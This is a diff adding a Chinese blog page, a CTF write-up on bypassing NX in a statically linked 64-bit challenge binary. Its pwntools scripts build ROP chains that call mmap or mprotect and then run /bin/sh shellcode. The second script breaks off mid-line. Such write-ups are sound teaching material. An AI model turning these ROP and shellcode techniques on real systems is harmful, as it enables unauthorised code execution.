@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>PWN学习总结之基础栈溢出2 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="继续搞pwn">
+<meta name="keywords" content="CTF,PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN学习总结之基础栈溢出2">
+<meta property="og:url" content="http://0x48.pw/2016/11/21/0x27/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="继续搞pwn">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn6.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn62.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn7.png">
+<meta property="og:updated_time" content="2016-11-21T09:52:46.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PWN学习总结之基础栈溢出2">
+<meta name="twitter:description" content="继续搞pwn">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/pwn6.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x27" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/11/21/0x27/" class="article-date">
+      <time datetime="2016-11-20T16:04:32.000Z" itemprop="datePublished">2016-11-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PWN学习总结之基础栈溢出2
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>继续搞pwn</p>
+<a id="more"></a>
+<p><a href="https://github.com/Hcamael/docker_lib/tree/master/pwn2" target="_blank" rel="external">Dockerfile</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> pwn</span></div><div class="line"><span class="meta">$</span><span class="bash"> docker build -t ubuntu:stack2 .</span></div><div class="line"><span class="meta">$</span><span class="bash"> docker run --name stack2 -it <span class="_">-d</span> -P ubuntu:stack2</span></div></pre></td></tr></table></figure></p>
+<h1 id="0x01-PWN6"><a href="#0x01-PWN6" class="headerlink" title="0x01 PWN6"></a>0x01 PWN6</h1><p>描述: 谁说开了nx我就用不了shellcode了.</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gdb pwn6</div><div class="line">gdb-peda$ checksec </div><div class="line">CANARY    : <span class="type">disabled</span></div><div class="line">FORTIFY   : <span class="type">disabled</span></div><div class="line">NX        : <span class="type">ENABLED</span></div><div class="line">PIE       : <span class="type">disabled</span></div><div class="line">RELRO     : <span class="type">Partial</span></div></pre></td></tr></table></figure>
+<p>只开了NX, 堆栈不可执行了, 要怎么执行shellcode呢?<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ binwalk pwn6 </div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line"><span class="number">0</span>             <span class="number">0x0</span>             ELF, <span class="number">64</span>-bit LSB executable, AMD x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux)</div><div class="line"><span class="number">613888</span>        <span class="number">0x95E00</span>         Unix <span class="string">path:</span> <span class="regexp">/proc/</span>sys<span class="regexp">/vm/</span>overcommit_memory</div><div class="line"><span class="number">620706</span>        <span class="number">0x978A2</span>         Unix <span class="string">path:</span> <span class="regexp">/sysdeps/</span>x86_64<span class="regexp">/multiarch/</span>../cacheinfo.c</div><div class="line"><span class="number">622053</span>        <span class="number">0x97DE5</span>         Unix <span class="string">path:</span> <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>rtsig-max</div><div class="line"><span class="number">624130</span>        <span class="number">0x98602</span>         Unix <span class="string">path:</span> <span class="regexp">/sysdeps/</span>unix<span class="regexp">/sysv/</span>linux/getcwd.c</div><div class="line"><span class="number">625541</span>        <span class="number">0x98B85</span>         Unix <span class="string">path:</span> <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>osrelease</div><div class="line"><span class="number">632992</span>        <span class="number">0x9A8A0</span>         Unix <span class="string">path:</span> <span class="regexp">/usr/</span>lib<span class="regexp">/locale/</span>locale-archive</div><div class="line"><span class="number">697530</span>        <span class="number">0xAA4BA</span>         Unix <span class="string">path:</span> <span class="regexp">/nptl/</span>sysdeps<span class="regexp">/unix/</span>sysv<span class="regexp">/linux/</span>x86_64<span class="regexp">/../</span>fork.c</div><div class="line"><span class="number">700624</span>        <span class="number">0xAB0D0</span>         ELF, <span class="number">64</span>-bit LSB processor-specific, (SYSV)</div><div class="line"><span class="number">703834</span>        <span class="number">0xABD5A</span>         Unix <span class="string">path:</span> <span class="regexp">/sysdeps/</span>unix<span class="regexp">/sysv/</span>linux/dl-origin.c</div></pre></td></tr></table></figure></p>
+<p>一个64位程序, 还是用的静态编译</p>
+<p>根据套路, 在NX打开的情况下可以通过两个函数执行shellcode</p>
+<p>一个是<code>mmap</code>:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ man mmap</div><div class="line"><span class="code">....</span></div><div class="line">void *mmap(void *addr, size_t length, int prot, int flags,</div><div class="line">                  int fd, off_t offset);</div><div class="line">....</div></pre></td></tr></table></figure></p>
+<p>还有一个是<code>mprotect</code>:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ man mprotect</div><div class="line"><span class="code">....</span></div><div class="line">int mprotect(void *addr, size_t len, int prot);</div><div class="line">....</div></pre></td></tr></table></figure></p>
+<p>而且正好, 这两个函数都被静态编译到代码中了,</p>
+<p>通过<code>mmap</code>函数执行shellcode的payload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line"><span class="comment"># context.terminal = ['terminator', '-x', 'bash', '-c']</span></div><div class="line"><span class="comment"># context.log_level = 'debug'</span></div><div class="line"></div><div class="line">p = <span class="built_in">process</span>(<span class="string">'pwn6'</span>)</div><div class="line">e = ELF(<span class="string">'pwn6'</span>)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"calculations: "</span>)</div><div class="line">p.sendline(<span class="string">"255"</span>)</div><div class="line"></div><div class="line">def set_add(addr=<span class="number">0</span>):</div><div class="line">	<span class="keyword">if</span> addr &lt; <span class="number">80</span>:</div><div class="line">		<span class="keyword">a</span> = <span class="number">100</span></div><div class="line">		b = <span class="keyword">a</span> - addr</div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"2"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(str(<span class="keyword">a</span>))</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(str(b))</div><div class="line"></div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"2"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(<span class="string">"100"</span>)</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(<span class="string">"100"</span>)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">a</span> = <span class="number">50</span></div><div class="line">		b = addr - <span class="keyword">a</span></div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"1"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(str(<span class="keyword">a</span>))</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(str(b))</div><div class="line"></div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"2"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(<span class="string">"100"</span>)</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(<span class="string">"100"</span>)</div><div class="line"></div><div class="line"><span class="comment"># padding</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">18</span>):</div><div class="line">	<span class="keyword">if</span> x == <span class="number">13</span> <span class="keyword">or</span> x == <span class="number">12</span>:</div><div class="line">		<span class="comment"># free(0)</span></div><div class="line">		<span class="keyword">a</span> = <span class="string">'100'</span></div><div class="line">		b = <span class="string">'100'</span></div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"2"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(<span class="keyword">a</span>)</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(b)</div><div class="line">		continue</div><div class="line">	<span class="keyword">a</span> = <span class="string">"1094778880"</span></div><div class="line">	b = <span class="string">"16705"</span></div><div class="line">	p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"1"</span>)</div><div class="line">	p.readuntil(<span class="string">"x: "</span>)</div><div class="line">	p.sendline(<span class="keyword">a</span>)</div><div class="line">	p.readuntil(<span class="string">"y: "</span>)</div><div class="line">	p.sendline(b)</div><div class="line"></div><div class="line">shellcode = <span class="string">'jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05'</span></div><div class="line">shellcode_addr = <span class="number">0x1921000</span></div><div class="line"><span class="comment"># mmap(rdi=shellcode_addr, rsi=len(shellcode), rdx=7, rcx=34, r8=0, r9=0)</span></div><div class="line">mmap_address = e.symbols[<span class="string">'mmap'</span>]</div><div class="line">read_address = e.symbols[<span class="string">'read'</span>]</div><div class="line"></div><div class="line">set_rdi = <span class="number">0x401b73</span></div><div class="line">set_rsi = <span class="number">0x401c87</span></div><div class="line">set_rdx = <span class="number">0x437a85</span></div><div class="line">set_rcx = <span class="number">0x4b8f17</span></div><div class="line"></div><div class="line"><span class="comment"># rdi = shellcode_addr</span></div><div class="line">set_add(set_rdi)</div><div class="line">set_add(shellcode_addr)</div><div class="line"><span class="comment"># rsi = len(shellcode)</span></div><div class="line">set_add(set_rsi)</div><div class="line">set_add(<span class="built_in">len</span>(shellcode))</div><div class="line"><span class="comment"># rdx = 7</span></div><div class="line">set_add(set_rdx)</div><div class="line">set_add(<span class="number">7</span>)</div><div class="line"><span class="comment"># rcx = 34</span></div><div class="line">set_add(set_rcx)</div><div class="line">set_add(<span class="number">34</span>)</div><div class="line"><span class="comment"># call mmap</span></div><div class="line">set_add(mmap_address)</div><div class="line"></div><div class="line"><span class="comment"># read(0, shellcode, len(shellcode))</span></div><div class="line">set_add(set_rdi)</div><div class="line">set_add(<span class="number">0</span>)</div><div class="line"></div><div class="line">set_add(set_rsi)</div><div class="line">set_add(shellcode_addr)</div><div class="line"></div><div class="line">set_add(set_rdx)</div><div class="line">set_add(<span class="built_in">len</span>(shellcode))</div><div class="line"></div><div class="line">set_add(read_address)</div><div class="line">set_add(shellcode_addr)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">p.sendline(<span class="string">'5'</span>)</div><div class="line">p.sendline(shellcode)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>首先是mmap的几个参数, 主要是prot和flags,</p>
+<p>其值的定义在<code>glibc/bits/mman-linux.h</code>文件中:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_READ        0x1                <span class="comment">/* Page can be read.  */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_WRITE       0x2                <span class="comment">/* Page can be written.  */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_EXEC        0x4                <span class="comment">/* Page can be executed. */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_NONE        0x0                <span class="comment">/* Page can not be accessed.  */</span></span></div></pre></td></tr></table></figure></p>
+<p>这个prot的4个参数, 根linux的权限设置差不多, 这里我把映射的地址设为<code>rwx</code>, 所以其值为7</p>
+<p>然后是flags的定义:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_SHARED        0x01           <span class="comment">/* Share changes.  */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_PRIVATE       0x02           <span class="comment">/* Changes are private.  */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_FIXED         0x10           <span class="comment">/* Interpret addr exactly.  */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __USE_MISC</span></div><div class="line"><span class="meta"># <span class="meta-keyword">define</span> MAP_FILE         0</span></div><div class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> __MAP_ANONYMOUS</span></div><div class="line"><span class="meta">#  <span class="meta-keyword">define</span> MAP_ANONYMOUS   __MAP_ANONYMOUS <span class="comment">/* Don't use a file.  */</span></span></div><div class="line"><span class="meta"># <span class="meta-keyword">else</span></span></div><div class="line"><span class="meta">#  <span class="meta-keyword">define</span> MAP_ANONYMOUS   0x20            <span class="comment">/* Don't use a file.  */</span></span></div><div class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta"># <span class="meta-keyword">define</span> MAP_ANON        MAP_ANONYMOUS</span></div></pre></td></tr></table></figure></p>
+<p>flags我们需要设置<code>MAP_ANONYMOUS</code>和<code>MAP_PRIVATE</code></p>
+<p>然后说说这个程序的溢出部分, 溢出部分其实很好找的</p>
+<p><img src="http://qn.lazysheep.cc/img/pwn6.png" alt="pwn6"></p>
+<p><code>memcpy(rdi, rsi, rdx=len(rsi))</code></p>
+<p>rdi的栈长度远小于rsi</p>
+<p>然后rsi的值为一个堆地址, 堆上储存了每次计算的结果, 所以可以通过构造计算, 来构造任意地址字符这些</p>
+<p>然后还有用<code>mprotect</code>来执行shellcode的payload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line"><span class="comment"># context.terminal = ['terminator', '-x', 'bash', '-c']</span></div><div class="line"><span class="comment"># context.log_level = 'debug'</span></div><div class="line"></div><div class="line">p = <span class="built_in">process</span>(<span class="string">'pwn6'</span>)</div><div class="line">e = ELF(<span class="string">'pwn6'</span>)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"calculations: "</span>)</div><div class="line">p.sendline(<span class="string">"255"</span>)</div><div class="line"></div><div class="line">def set_add(addr=<span class="number">0</span>):</div><div class="line">	<span class="keyword">if</span> addr &lt; <span class="number">80</span>:</div><div class="line">		<span class="keyword">a</span> = <span class="number">100</span></div><div class="line">		b = <span class="keyword">a</span> - addr</div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"2"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(str(<span class="keyword">a</span>))</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(str(b))</div><div class="line"></div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"2"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(<span class="string">"100"</span>)</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(<span class="string">"100"</span>)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">a</span> = <span class="number">50</span></div><div class="line">		b = addr - <span class="keyword">a</span></div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span 